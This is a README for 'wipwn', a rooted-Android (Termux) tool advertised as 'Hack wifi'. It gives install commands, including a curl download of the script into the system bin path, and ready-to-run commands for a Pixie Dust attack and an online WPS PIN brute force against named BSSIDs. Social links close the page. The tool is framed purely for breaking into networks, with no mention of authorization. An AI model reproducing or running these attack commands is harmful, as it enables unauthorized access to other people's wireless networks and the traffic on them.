# wipwn
Hack wifi using termux (rooted)

## <a href = "https://t.me/cybersh_official/127" > Tutorial</a>

### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python termux-api wpa-supplicant pixiewps iw -y
git clone https://github.com/ShTasrif/wipwn
pip install requests
cd wipwn
chmod +x wipwn.py
```
### Single cmd Setup
```bash
curl https://raw.githubusercontent.com/ShTasrif/wipwn/main/wipwn --output /data/data/com.termux/files/usr/bin/wipwn
chmod +x /data/data/com.termux/files/usr/bin/wipwn
```
#### Help : `sudo python wipwn.py --help`
#### Example : `sudo python wipwn.py -i wlan0 -K`
### Shortcut : wipwn
```bash
cd $PREFIX/bin && echo 'cd $HOME ; cd wipwn ; sudo python wipwn.py -i wlan0 -K' > wipwn && chmod +x wipwn
```
#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python wipwn.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python wipwn.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python wipwn.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
#### Modify History : 
rofl0r => Biri_B@B@ => Mohammad_Alamin (Toxinum) => SH TASRIF (CYBER SH)
<br>
<h3>Visitors :</h3>
<br>
<img src="https://profile-counter.glitch.me/ShTasrif/count.svg" alt="Visitors">

<div align="center">

<h3>━━━━ Connect with me ━━━━</h3>

<a href="https://fb.com/cybershbd" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/facebook.svg" alt="TOXIC-VIRUS" height="30" width="40" /></a>
<a href="https://twitter.com/cybershbd" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/twitter.svg" alt="cybershbd" height="30" width="40" /></a>
<a href="https://fb.com/cybershbd" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/facebook.svg" alt="Mohammad Alamin" height="30" width="40" /></a>
<a href="https://instagram.com/cybershbd" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg" alt="akxvau" height="30" width="40" /></a>

</div>
